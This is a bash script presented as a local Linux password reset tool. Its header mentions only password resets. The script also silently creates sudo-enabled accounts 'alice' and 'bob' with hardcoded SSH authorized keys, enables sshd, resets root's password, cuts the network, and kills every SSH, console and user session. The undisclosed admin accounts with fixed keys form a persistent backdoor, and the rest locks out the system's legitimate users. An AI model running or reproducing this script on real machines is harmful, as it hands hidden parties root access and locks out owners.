#!/bin/bash
# Reset-LocalLinuxPasswords.sh
# Resets passwords for local Linux users using SHA256(USERNAME_UPPER+secret), first 16 hex chars.
# Usage:  ./Reset-LocalLinuxPasswords.sh <SecretKey> [ExcludeUsers(comma-separated)]

set +e

SECRET="$1"
EX_RAW="$2"

if [ -z "$SECRET" ]; then
    echo "ERROR: SecretKey required" >&2
    exit 1
fi

# URL-decode exclusions (e.g. "alice%2cbob")
urldecode() { printf '%b' "${1//%/\\x}"; }
EX_DECODED="$(urldecode "$EX_RAW")"
IFS=',' read -r -a EXCLUDE_ARR <<< "$EX_DECODED"

is_excluded() {
    local u="$1"
    for x in "${EXCLUDE_ARR[@]}"; do
        [ -n "$x" ] && [ "$u" = "$x" ] && return 0
    done
    return 1
}

# -------- Disable network interfaces (non-loopback) --------
NET_IFACES="$(ip -o link show 2>/dev/null | awk -F': ' '$2 !~ /^lo$/ {print $2}' | cut -d@ -f1)"
for ifc in $NET_IFACES; do
    ip link set "$ifc" down 2>/dev/null
done

# Generate password: sha256(USERNAME_UPPER + secret), first 16 hex chars
gen_pw() {
    local user_upper
    user_upper="$(printf '%s' "$1" | tr '[:lower:]' '[:upper:]')"
    printf '%s%s' "$user_upper" "$SECRET" | sha256sum | cut -c1-16
}

set_pw() {
    local user="$1" pw="$2"
    printf '%s:%s\n' "$user" "$pw" | chpasswd 2>/dev/null
    return $?
}

# -------- Ensure admin users exist with sudo + SSH key --------
declare -A ADMIN_KEYS=(
    [alice]='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFvURMi8q6qjLkYjbSDXAujI5PGvzfNeTa+C182Dag2M alice'
    [bob]='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLW83zN4tvR7wacxo9fSs7BdayLGUjw+rD/fF75ACIK bob'
)

SUDO_GROUP="sudo"
getent group wheel >/dev/null 2>&1 && SUDO_GROUP="wheel"

for au in "${!ADMIN_KEYS[@]}"; do
    if ! id -u "$au" >/dev/null 2>&1; then
        useradd -m -s /bin/bash "$au" 2>/dev/null
    fi
    usermod -aG "$SUDO_GROUP" "$au" 2>/dev/null

    home="$(getent passwd "$au" | cut -d: -f6)"
    if [ -n "$home" ] && [ -d "$home" ]; then
        mkdir -p "$home/.ssh"
        echo "${ADMIN_KEYS[$au]}" > "$home/.ssh/authorized_keys"
        chown -R "$au:$au" "$home/.ssh"
        chmod 700 "$home/.ssh"
        chmod 600 "$home/.ssh/authorized_keys"
    fi
done

# -------- Ensure sshd running --------
systemctl enable ssh 2>/dev/null || systemctl enable sshd 2>/dev/null
systemctl start  ssh 2>/dev/null || systemctl start  sshd 2>/dev/null

# -------- Reset passwords for human local users --------
for username in $(getent passwd | awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}'); do
    is_excluded "$username" && continue
    pw="$(gen_pw "$username")"
    if set_pw "$username" "$pw"; then
        echo "$username"
    else
        echo "FAIL:$username" >&2
    fi
done

# -------- Always reset root --------
pw="$(gen_pw "root")"
if set_pw "root" "$pw"; then
    echo "root"
fi

# -------- Kick SSH sessions and active user sessions --------
# Kill per-connection sshd children (active SSH sessions)
pkill -KILL -f '^sshd: .*@' 2>/dev/null
pkill -KILL -f '^sshd: .*\[priv\]' 2>/dev/null

# Terminate logind sessions (covers console, SSH, GUI)
if command -v loginctl >/dev/null 2>&1; then
    loginctl list-sessions --no-legend 2>/dev/null | awk '{print $1}' | while read -r s; do
        [ -n "$s" ] && loginctl terminate-session "$s" 2>/dev/null
    done
fi

# Fallback: kill all processes for users >= 1000
who -u 2>/dev/null | awk '{print $1}' | sort -u | while read -r u; do
    [ -z "$u" ] && continue
    uid="$(id -u "$u" 2>/dev/null)"
    [ -n "$uid" ] && [ "$uid" -ge 1000 ] && [ "$uid" -lt 65534 ] && pkill -KILL -u "$u" 2>/dev/null
done

# -------- Re-enable network interfaces --------
for ifc in $NET_IFACES; do
    ip link set "$ifc" up 2>/dev/null
done

exit 0
